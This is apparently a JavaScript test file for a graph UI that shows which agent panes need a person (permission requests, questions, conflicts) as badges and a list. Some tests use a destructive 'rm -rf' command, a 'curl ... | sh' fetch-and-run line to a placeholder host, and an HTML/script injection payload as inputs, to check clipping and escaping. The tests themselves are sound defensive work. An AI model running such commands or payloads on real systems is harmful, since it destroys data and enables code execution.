// The needs-you badges and the strip: who needs the person and why, from the
// graph alone. The fixtures' .md files say who needs the person; the badges and
// the strip must say the same, in the graph's order, and no one else.
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync, readdirSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";
import { renderToString } from "./vendor/render-to-string.mjs";
import { html } from "../assets/html.js";
import { buildGraphModel } from "../assets/graph/model.js";
import { layoutGraph } from "../assets/graph/layout.js";
import { GraphView } from "../assets/graph/Graph.js";
import { reasonOf, firstLine, BADGE } from "../assets/graph/Badge.js";
import { NeedsYou, rowOf, ageOf } from "../assets/graph/NeedsYou.js";

const here = dirname(fileURLToPath(import.meta.url));
const dir = join(here, "..", "..", "..", "server", "testdata", "graph-fixtures");
const names = readdirSync(dir)
  .filter((f) => f.endsWith(".json"))
  .map((f) => f.slice(0, -5))
  .sort();
const load = (name) => JSON.parse(readFileSync(join(dir, name + ".json"), "utf8"));
const draw = (msg) => renderToString(html`<${GraphView} model=${buildGraphModel(msg)} />`);

// "- name (id8): reason", or "- a (id8) and b (id8): reason" for a conflict.
function expectedNeeds(name) {
  const md = readFileSync(join(dir, name + ".md"), "utf8").replace(/\r\n/g, "\n");
  const section = md.split("## Needs the person")[1].split("\n## ")[0];
  const out = [];
  for (const line of section.split("\n")) {
    if (!line.startsWith("- ")) continue;
    const panes = [...line.matchAll(/\(([0-9a-f]{8})\)/g)].map((m) => m[1]);
    const reason = line.slice(line.indexOf("): ") + 3);
    let kind = "";
    if (/^asks to run /.test(reason)) kind = "permission";
    else if (/^asks: /.test(reason)) kind = "ask";
    else if (/^task returned from review/.test(reason)) kind = "returned";
    else if (/ both change /.test(line)) kind = "conflict";
    else if (/^exited with /.test(reason)) kind = "down";
    else if (/ unread: /.test(reason)) kind = "stale-unread";
    out.push({ kind, panes, reason });
  }
  return out;
}

const WORDS = {
  permission: "asks to run a command",
  ask: "asks a question",
  returned: "task returned from review",
  conflict: "files overlap",
  "stale-unread": "has unread mail",
  setup: "needs setting up",
};

const unescape = (s) => s.replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&quot;/g, '"').replace(/&amp;/g, "&");

// The badges drawn, as [pane, kind, word].
function badgesOf(out) {
  const found = [];
  for (const m of out.matchAll(/<g class="gneed" data-pane="([^"]*)"[^>]*><g class="gbadge[^"]*" data-kind="([^"]*)"[^>]*>(.*?)<\/g>(?=<\/g>)/g)) {
    const word = /<text class="gbadge-word"[^>]*>([^<]*)</.exec(m[3]);
    found.push([unescape(m[1]), m[2], word ? unescape(word[1]) : ""]);
  }
  return found;
}

// The strip's rows, as [pane, kind, who, word].
function rowsOf(out) {
  const found = [];
  for (const m of out.matchAll(/<li class="needs-row[^"]*" data-pane="([^"]*)" data-kind="([^"]*)">(.*?)<\/li>/g)) {
    const who = /<span class="needs-who">([^<]*)</.exec(m[3]);
    const word = /<span class="needs-word">([^<]*)</.exec(m[3]);
    found.push([unescape(m[1]), m[2], who ? unescape(who[1]) : "", word ? unescape(word[1]) : ""]);
  }
  return found;
}

for (const name of names) {
  test(`fixture ${name}: the panes that need the person have a badge and a row with the right word, and no others do`, () => {
    const msg = load(name);
    const expected = expectedNeeds(name);
    assert.ok(expected.length > 0, "the fixture has needs");
    const out = draw(msg);
    const badges = badgesOf(out);
    const rows = rowsOf(out);

    const wantPanes = new Set(expected.flatMap((e) => e.panes));
    assert.deepEqual(new Set(badges.map((b) => b[0])), wantPanes, "badges are on exactly the panes that need the person");
    assert.equal(badges.length, wantPanes.size, "one badge per pane");

    assert.equal(rows.length, expected.length, "one row per item");
    // The .md lists the needs by their importance to a reader and the graph in its
    // own order, so the rows are matched to the items here, and the order is
    // tested apart, against the message.
    const used = new Set();
    for (const e of expected) {
      const at = rows.findIndex((r, i) => !used.has(i) && r[1] === e.kind && e.panes.includes(r[0]));
      assert.ok(at >= 0, `no row for ${e.kind} on ${e.panes}`);
      used.add(at);
      if (e.kind === "down") assert.match(rows[at][3], /^exited with code \d+$/, "word");
      else assert.equal(rows[at][3], WORDS[e.kind], "word");
      for (const p of e.panes) {
        const b = badges.find((x) => x[0] === p);
        assert.ok(b, `no badge on ${p}`);
        // A pane with one item has the item's word on its badge.
        if (expected.filter((x) => x.panes.includes(p)).length === 1) {
          if (e.kind === "down") assert.match(b[2], /^exited with code \d+$/);
          else assert.equal(b[2], WORDS[e.kind]);
        }
      }
    }
  });

  test(`fixture ${name}: the strip is in the graph's own order`, () => {
    const msg = load(name);
    const model = buildGraphModel(msg);
    const rows = rowsOf(draw(msg));
    assert.deepEqual(
      rows.map((r) => r[0]),
      model.needs.map((n) => n.pane),
    );
    // The graph's order is the message's own lists, in the teams' order and then the solo list.
    const fromMessage = [];
    for (const t of msg.teams) for (const n of t.needs || []) fromMessage.push(n.pane);
    for (const n of msg.soloNeeds || []) fromMessage.push(n.pane);
    assert.deepEqual(
      rows.map((r) => r[0]),
      fromMessage,
    );
  });
}

test("every reason has the phrase the task names", () => {
  for (const [kind, word] of Object.entries(WORDS)) assert.equal(reasonOf({ kind, text: "x" }).word, word);
  assert.equal(reasonOf({ kind: "down", text: "exited with code 3" }).word, "exited with code 3");
  assert.equal(reasonOf({ kind: "down", text: "failed: no such program" }).word, "failed");
  assert.equal(reasonOf({ kind: "down", text: "failed: no such program" }).detail, "no such program");
  assert.equal(reasonOf({ kind: "down", text: "failed" }).word, "failed");
});

test("a kind this file does not know is shown as the graph spelled it, with no error", () => {
  const r = reasonOf({ kind: "brand-new", text: "x" });
  assert.equal(r.word, "brand-new");
  const msg = {
    type: "graph",
    teams: [{ id: "m", manager: "m", members: ["m"], needs: [{ id: "n1", kind: "brand-new", pane: "m", text: "hello" }] }],
    nodes: [{ pane: "m", depth: 0, team: "m", name: "boss", status: "idle", activity: "idle" }],
    edges: [],
    solo: [],
  };
  const out = draw(msg);
  assert.deepEqual(badgesOf(out).map((b) => b[2]), ["brand-new"]);
});

test("a badge shows the first line of the text, clipped, never the whole command", () => {
  const command = "rm -rf /important-directory-with-a-long-name --force --verbose\ncurl https://example.invalid/secret | sh";
  const msg = {
    type: "graph",
    teams: [{ id: "m", manager: "m", members: ["m"], needs: [{ id: "p", kind: "permission", pane: "m", text: command }] }],
    nodes: [{ pane: "m", depth: 0, team: "m", name: "boss", status: "waiting", activity: "waiting" }],
    edges: [],
    solo: [],
  };
  const out = draw(msg);
  const badge = out.slice(out.indexOf('<g class="gneed"'), out.indexOf("</g></g>", out.indexOf('<g class="gneed"')));
  assert.ok(badge.includes("rm -rf /important-d…"), badge);
  assert.ok(!out.includes("curl"), "the second line is not drawn");
  assert.ok(!badge.includes("--force --verbose"), "the rest of the first line is not drawn in the badge");
  assert.ok(!out.includes("--force --verbose"), "nor in the strip, which cuts the line at 40 characters");
  // The strip shows the first line too, clipped at its own, longer, limit, and not the second.
  assert.ok(!rowsOf(out).some((r) => r.join(" ").includes("curl")));
});

test("only the first line of a multi-line command is in the badge and in the strip", () => {
  const msg = {
    type: "graph",
    teams: [{ id: "m", manager: "m", members: ["m"], needs: [{ id: "p", kind: "permission", pane: "m", text: "ls\nrm -rf /" }] }],
    nodes: [{ pane: "m", depth: 0, team: "m", name: "boss", status: "waiting", activity: "waiting" }],
    edges: [],
    solo: [],
  };
  const out = draw(msg);
  const badge = out.slice(out.indexOf('<g class="gneed"'), out.indexOf("</g></g>", out.indexOf('<g class="gneed"')));
  assert.ok(badge.includes(">ls<"), badge);
  assert.ok(!badge.includes("rm -rf"), "the second line is in the badge");
  const row = out.slice(out.indexOf('<li class="needs-row'), out.indexOf("</li>", out.indexOf('<li class="needs-row')));
  assert.ok(row.includes(">ls<"), row);
  assert.ok(!row.includes("rm -rf"), "the second line is in the strip");
});

test("a need cleared by a new push takes its badge and its row with it, in the same render", () => {
  const msg = load("01-six-helpers-one-permission");
  const before = draw(msg);
  assert.equal(badgesOf(before).length, 2, "the permission pane and the second pane of the conflict");
  const cleared = JSON.parse(JSON.stringify(msg));
  for (const t of cleared.teams) t.needs = [];
  const after = draw(cleared);
  assert.equal(badgesOf(after).length, 0);
  assert.equal(rowsOf(after).length, 0);
  assert.match(after, /Nothing needs you\./);
  assert.ok(!after.includes('class="gbadge'));
});

test("a need for a pane that is not a node is in the strip, with no badge and no error", () => {
  const msg = load("01-six-helpers-one-permission");
  msg.teams[0].needs.push({ id: "ask:ghost", kind: "ask", pane: "ghost123", time: "2026-10-21T08:00:00Z", text: "Who am I?" });
  const out = draw(msg);
  const rows = rowsOf(out);
  const ghost = rows.find((r) => r[0] === "ghost123");
  assert.ok(ghost, "a row for the missing pane");
  assert.equal(ghost[2], "ghost123", "named by its id");
  assert.equal(ghost[3], "asks a question");
  assert.ok(!badgesOf(out).some((b) => b[0] === "ghost123"));
  assert.equal(rows.length, expectedNeeds("01-six-helpers-one-permission").length + 1);
  // It is not a button, because there is no pane to open.
  const picked = [];
  const strip = renderToString(html`<${NeedsYou} model=${buildGraphModel(msg)} onSelect=${(p) => picked.push(p)} />`);
  assert.equal(strip.split("<button").length - 1, rows.length - 1);
});

test("a conflict is badged on both panes and named for both in its row", () => {
  const msg = {
    type: "graph",
    teams: [{ id: "m", manager: "m", members: ["m", "a", "b"], needs: [{ id: "c", kind: "conflict", pane: "a", other: "b", text: "both change main.go" }] }],
    nodes: [
      { pane: "m", depth: 0, team: "m", children: ["a", "b"], name: "boss", status: "idle", activity: "idle" },
      { pane: "a", parent: "m", depth: 1, team: "m", name: "alpha", status: "working", activity: "working" },
      { pane: "b", parent: "m", depth: 1, team: "m", name: "beta", status: "working", activity: "working" },
    ],
    edges: [],
    solo: [],
  };
  const out = draw(msg);
  assert.deepEqual(badgesOf(out).map((b) => b[0]).sort(), ["a", "b"]);
  assert.deepEqual(rowsOf(out).map((r) => r[2]), ["alpha and beta"]);
});

test("a pane with several needs shows the first and a count", () => {
  const msg = {
    type: "graph",
    teams: [
      {
        id: "m",
        manager: "m",
        members: ["m"],
        needs: [
          { id: "1", kind: "permission", pane: "m", text: "go test" },
          { id: "2", kind: "ask", pane: "m", text: "Which one?" },
        ],
      },
    ],
    nodes: [{ pane: "m", depth: 0, team: "m", name: "boss", status: "waiting", activity: "waiting" }],
    edges: [],
    solo: [],
  };
  const out = draw(msg);
  assert.deepEqual(badgesOf(out), [["m", "permission", "asks to run a command"]]);
  assert.match(out, /class="gbadge-more"[^>]*>\+1</);
  assert.equal(rowsOf(out).length, 2);
});

test("each reason has an icon of its own shape", () => {
  const kinds = ["permission", "ask", "returned", "conflict", "down", "stale-unread", "setup"];
  const shapes = new Set();
  for (const kind of kinds) {
    const msg = {
      type: "graph",
      teams: [{ id: "m", manager: "m", members: ["m"], needs: [{ id: "n", kind, pane: "m", text: "x" }] }],
      nodes: [{ pane: "m", depth: 0, team: "m", name: "boss", status: "idle", activity: "idle" }],
      edges: [],
      solo: [],
    };
    const out = draw(msg);
    const icon = /<g class="gicon gicon--([a-z-]+)"[^>]*>(.*?)<\/g>/.exec(out.slice(out.indexOf('<g class="gneed"')));
    assert.equal(icon[1], kind);
    shapes.add(icon[2]);
  }
  assert.equal(shapes.size, kinds.length, "two reasons share an icon");
});

test("text from an agent in a need is drawn as text, in the badge and in the strip", () => {
  const evil = '<img src=x onerror="alert(1)"><script>alert(2)</script>';
  const msg = {
    type: "graph",
    teams: [{ id: "m", manager: "m", members: ["m"], needs: [{ id: evil, kind: "permission", pane: "m", text: evil }, { id: "k", kind: evil, pane: "m", text: evil }] }],
    nodes: [{ pane: "m", depth: 0, team: "m", name: evil, status: "waiting", activity: "waiting" }],
    edges: [],
    solo: [],
  };
  const out = draw(msg);
  assert.ok(!out.includes("<img"), out);
  assert.ok(!out.includes("<script"), out);
  assert.ok(!/ onerror=/.test(out.replace(/&quot;/g, "")) || !out.includes('"alert(1)"'), out);
});

test("firstLine skips blank lines and trims", () => {
  assert.equal(firstLine("\n  \n  go test ./...  \nsecond"), "go test ./...");
  assert.equal(firstLine(null), "");
  assert.equal(firstLine("a\r\nb"), "a");
});

test("the strip says so when nothing needs the person, and counts what the graph left out", () => {
  const none = renderToString(html`<${NeedsYou} model=${buildGraphModel({ type: "graph", teams: [], nodes: [], solo: [] })} />`);
  assert.match(none, /Nothing needs you\./);
  const some = buildGraphModel({
    type: "graph",
    teams: [{ id: "m", manager: "m", members: ["m"], needsHidden: 4, needs: [{ id: "1", kind: "ask", pane: "m", text: "x" }] }],
    nodes: [{ pane: "m", depth: 0, team: "m", name: "boss", status: "idle", activity: "idle" }],
    solo: [],
  });
  assert.match(renderToString(html`<${NeedsYou} model=${some} />`), /and 4 more not shown/);
});

test("rowOf names a pane by its id when it has no node", () => {
  const model = buildGraphModel({ type: "graph", teams: [], nodes: [], solo: [], soloNeeds: [{ id: "x", kind: "down", pane: "zz", text: "exited with code 2" }] });
  const row = rowOf(model, model.needs[0]);
  assert.equal(row.who, "zz");
  assert.equal(row.word, "exited with code 2");
  assert.equal(row.shown, false);
});

// A width estimate for each text in a badge, as the node tests make for a box.
const EM = { mono: 0.6, bold: 0.58 };
test("every text in a badge fits the badge and clears its neighbours", () => {
  const long = "e".repeat(90);
  const kinds = ["permission", "ask", "returned", "conflict", "down", "stale-unread", "setup", "an-unknown-kind-of-need"];
  const nodes = kinds.map((k, i) => ({ pane: "p" + i, depth: 0, name: "n" + i, status: "waiting", activity: "waiting" }));
  const needs = [];
  kinds.forEach((k, i) => {
    needs.push({ id: "a" + i, kind: k, pane: "p" + i, text: long });
    needs.push({ id: "b" + i, kind: k, pane: "p" + i, text: long });
  });
  needs.push({ id: "d", kind: "down", pane: "p4", text: "failed: " + long });
  const out = draw({ type: "graph", teams: [], nodes, edges: [], solo: nodes.map((n) => n.pane), soloNeeds: needs });
  const runs = [];
  for (const g of out.split('<g class="gbadge').slice(1)) {
    const mine = [];
    for (const m of g.matchAll(/<text class="(gbadge-[a-z]+)" x="(-?[\d.]+)" y="(-?[\d.]+)"( text-anchor="end")?>([^<]*)<\/text>/g)) {
      const size = m[1] === "gbadge-word" ? 11 : 11;
      const face = m[1] === "gbadge-word" ? "bold" : "mono";
      const width = Array.from(unescape(m[5])).length * EM[face] * size;
      const x = Number(m[2]);
      const end = m[4] !== undefined;
      mine.push({ kind: m[1], y: Number(m[3]), text: m[5], x0: end ? x - width : x, x1: end ? x : x + width });
    }
    runs.push(mine);
  }
  assert.equal(runs.length, kinds.length);
  for (const mine of runs) {
    assert.ok(mine.length >= 2);
    for (const r of mine) {
      assert.ok(r.x0 >= BADGE.x + 28 && r.x1 <= BADGE.x + BADGE.w - 4, `"${r.text}" runs from ${r.x0.toFixed(0)} to ${r.x1.toFixed(0)} in a badge from ${BADGE.x} to ${BADGE.x + BADGE.w}`);
      assert.ok(r.y > -BADGE.lift && r.y < -BADGE.lift + BADGE.h, "the text is inside the badge");
    }
    for (let i = 0; i < mine.length; i++) {
      for (let j = i + 1; j < mine.length; j++) {
        if (Math.abs(mine[i].y - mine[j].y) < 12) assert.ok(mine[i].x1 + 4 <= mine[j].x0 || mine[j].x1 + 4 <= mine[i].x0, `"${mine[i].text}" meets "${mine[j].text}"`);
      }
    }
  }
});

// A badge is a rectangle hung above its box; none may cover any box.
test("no badge covers a box, in a strip or an unlinked set of several rows", () => {
  const many = (n) => Array.from({ length: n }, (_, i) => ({ pane: "p" + i, depth: 0, name: "n" + i, status: "waiting", activity: "waiting" }));
  const solo = many(14);
  const team = many(14).map((n) => ({ ...n, pane: "t" + n.pane, team: "m" }));
  const needsOf = (nodes) => nodes.map((n) => ({ id: "n" + n.pane, kind: "permission", pane: n.pane, text: "ls" }));
  const manager = { pane: "m", depth: 0, team: "m", name: "boss", status: "working", activity: "working" };
  const msg = {
    type: "graph",
    teams: [{ id: "m", manager: "m", members: ["m", ...team.map((n) => n.pane)], needs: needsOf(team) }],
    nodes: [manager, ...team, ...solo],
    edges: [],
    solo: solo.map((n) => n.pane),
    soloNeeds: needsOf(solo),
  };
  const model = buildGraphModel(msg);
  const lay = layoutGraph(model);
  const rows = new Set(lay.nodes.filter((b) => b.team === "").map((b) => b.y));
  assert.ok(rows.size > 1, "the strip has one row only, so the test checks nothing");
  const teamRows = new Set(lay.nodes.filter((b) => b.team === "m" && b.pane !== "m").map((b) => b.y));
  assert.ok(teamRows.size > 1, "the team has one row only");
  let badges = 0;
  for (const b of lay.nodes) {
    if (!model.needsByPane.has(b.pane)) continue;
    badges++;
    const r = { x: b.x + BADGE.x, y: b.y - BADGE.lift, w: BADGE.w, h: BADGE.h };
    for (const o of lay.nodes) {
      const hit = r.x < o.x + o.w && o.x < r.x + r.w && r.y < o.y + o.h && o.y < r.y + r.h;
      assert.ok(!hit, `the badge on ${b.pane} covers the box of ${o.pane}`);
    }
  }
  assert.ok(badges >= 28, "badges: " + badges);
});

test("a badge hangs inside its team's frame, below the team's title", () => {
  for (const name of names) {
    const model = buildGraphModel(load(name));
    const lay = layoutGraph(model);
    for (const [pane] of model.needsByPane) {
      const b = lay.byPane.get(pane);
      if (!b) continue;
      const frame = b.team === "" ? lay.solo : lay.teams.find((f) => f.id === b.team);
      assert.ok(b.y - BADGE.lift >= frame.y + 30, `${name}: the badge on ${pane} is over the frame's title`);
    }
  }
});

test("ageOf says how long ago, and nothing for an unknown or future time", () => {
  const now = Date.parse("2026-10-24T12:00:00Z");
  assert.equal(ageOf("2026-10-24T11:59:30Z", now), "now");
  assert.equal(ageOf("2026-10-24T11:51:00Z", now), "9m");
  assert.equal(ageOf("2026-10-24T09:00:00Z", now), "3h");
  assert.equal(ageOf("2026-10-21T12:00:00Z", now), "3d");
  assert.equal(ageOf("0001-01-01T00:00:00Z", now), "", "an unknown time");
  assert.equal(ageOf("2026-10-24T12:05:00Z", now), "", "a time ahead of the clock");
  assert.equal(ageOf("", now), "");
});
